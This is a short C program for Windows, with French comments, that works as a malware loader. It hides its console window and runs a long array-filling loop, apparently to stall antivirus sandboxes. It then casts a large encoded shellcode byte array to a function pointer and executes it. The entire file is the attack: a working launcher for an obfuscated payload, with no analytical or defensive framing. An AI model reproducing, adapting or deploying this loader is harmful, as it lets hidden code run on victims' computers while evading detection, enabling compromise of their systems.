#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

int main(int argc, char * argv[])
{

		// on cache la console au lancement
		HWND hWnd = GetConsoleWindow();
		ShowWindow(hWnd, SW_MINIMIZE);
		ShowWindow(hWnd, SW_HIDE);


		int k=0;
		while(k<10000)				//On alloue 99999 fois un tableau de 100000 caractÃ¨res que l'on remplit de 6
  	       {
    			int j=0;
    			int tableau2[100000];
   			 while (j<99999)
   	 		{
    	 	     	      tableau2[j]=6;
   	                      j++;
        
        	        }
   		        k++;
 	        }
                if(k>9000)
                {
			unsigned char shellcode[] =
"\xdb\xc3\xd9\x74\x24\xf4\xb8\xff\x45\x2a\x3a\x5a\x31\xc9\xb1"
"\x93\x31\x42\x17\x83\xc2\x04\x03\xbd\x56\xc8\xcf\xfb\x4e\x56"
"\x0d\x05\xab\xb8\xb4\x8d\x68\xb1\x1f\x5e\xb8\x88\x2c\x23\xfa"
"\xef\x1d\x73\xf4\xec\x0d\x6b\xb2\x3b\x89\x76\x46\x82\x14\x69"
"\xaa\x11\x14\xac\xcc\x96\x63\xe2\x9c\xd1\x77\xf7\x55\xd4\xd0"
"\x83\x21\x8d\xaa\xc5\x04\x05\x89\x01\xc6\xd3\xc6\x5e\x55\x01"
"\xff\xe8\x6a\x3e\xb2\x88\xac\xa8\xd6\x26\x80\x11\xe9\x49\xd4"
"\x72\x4e\xf8\xf3\x18\xe7\x48\xc3\x46\xa4\x7d\xf9\xb7\x10\xe8"
"\xc1\xd7\x0f\x2c\x93\xb9\x29\xc5\x6d\x0e\xf3\x2e\xcb\x51\x40"
"\xf0\xbb\x82\x93\x40\xe4\x53\x2d\xd7\x80\x4c\xde\x43\x5c\x08"
"\x79\x46\x3c\x70\xb6\xf4\x4b\x52\xff\x48\x20\xa6\x94\x8b\x7a"
"\xfb\x34\x0a\x73\x51\x53\x20\x03\x7a\x72\xe1\xc9\x91\xcc\xd1"
"\x20\x79\xd6\xd1\xd2\x2c\x04\xb6\xc4\x72\xac\xbe\xc3\xb3\x0c"
"\x5f\xb1\xb9\xb1\xd2\xf8\x95\x20\x7b\x33\x4d\x58\x69\x85\xfb"
"\xcc\x15\xb9\xfe\xc5\x28\xb2\x55\x86\x1e\x6f\x52\x18\x5a\x71"
"\x9c\xb2\x5e\x7b\x03\xf5\xe1\x1d\x3e\x99\x1c\x5a\x9c\x35\x78"
"\x5d\x40\xa4\x0d\xb7\x2d\x2c\x30\xf4\x11\xfb\xfa\xc9\xaa\x2b"
"\xb1\x67\x5f\x69\x88\xbf\x98\x95\x5b\xb3\xec\xbf\xca\x82\x6d"
"\xb1\x0a\xb6\x5a\x79\xaf\x5f\xed\xb7\xed\x13\x5d\xf8\x18\xaa"
"\xc9\x7f\xd8\x57\x59\x82\x4d\x15\x50\x4a\x91\x85\x87\x27\xaa"
"\x46\x79\xd6\xe2\xa7\xc9\xaf\x6a\xb0\x3c\xc0\xd8\xfe\xd1\x0e"
"\x52\x94\x67\x5a\x6e\x10\xab\x11\xe5\x47\x7c\xc7\xb5\x13\xa2"
"\x07\x73\x07\xb8\x3a\x73\x81\xab\xbb\x64\xdb\xfe\x2e\xa5\xc2"
"\x10\xaa\xa5\xb8\x42\xbc\x7e\xeb\xfc\x89\x8c\x0b\x3c\x4f\x3a"
"\xed\x50\xc3\x9d\x07\x5c\xd9\xe2\x1e\x19\xa8\x57\xb2\x69\x8a"
"\x96\xac\xec\x1d\x0e\x25\xb4\xa5\xfb\x69\xda\x65\xde\x3f\x5f"
"\xed\xc2\xbc\xf1\xc9\x89\xda\x90\xa4\xd1\xba\x8f\x65\xab\x77"
"\x31\xdb\x3b\xba\xd2\x7e\x8e\xc6\x77\x26\x82\xd4\xc1\xed\x4e"
"\x18\xa9\x2e\x28\x30\xfe\x48\x3d\x41\x60\xbd\xb3\xc2\x93\x54"
"\x1f\x77\x03\xf0\x96\x37\x94\x74\x4a\x92\xb1\x1d\x71\xc5\xb6"
"\xe9\x74\x11\x9b\x5e\xb0\x2a\xd4\xf8\x21\x0c\x80\x3f\x03\xfd"
"\xb7\x7f\x44\x9c\x4d\xe2\x2d\x76\xb9\x52\x81\xb0\x32\x7b\x6d"
"\xf4\x52\xaa\x58\x6f\x8f\x68\xf8\xbb\x6a\xed\x26\xa3\xc6\x44"
"\x91\x0d\x44\xab\xc3\x93\xde\x12\x18\x6b\xb2\xb6\x10\x1b\x11"
"\xf5\xdb\xfb\x18\xbc\xa9\x86\x9d\x89\x5a\x1f\x1b\x8f\xb1\x7f"
"\x0c\xeb\x13\x36\x89\xe3\xed\x36\x8c\x7c\x69\xac\xe9\x2d\x04"
"\x9a\xb8\xcb\x0c\xf3\xc5\xd9\x76\x94\xf8\xb0\x3f\xa8\x80\x5d"
"\x82\x37\x83\x36\xb0\x6b\x6d\xc5\x00\xdb\x8e\x36\x96\xca\xc5"
"\xd2\x33\x16\x9b\xe6\x2e\x2c\x7f\xbe\x3b\x6f\x90\x16\x20\xeb"
"\x9d\x4c\xa6\x0a\xae\x87\x60\x64\x48\x9e\x17\x72\x72\x79\x7b"
"\x1e\x2b\x56\xf3\xf2\xd8\x45\x3d\xf7\x2a\xfb";


			int (*ret)() = (int(*)())shellcode;
									//Execution du ShellCode
			ret();
		}

	return 1;
}
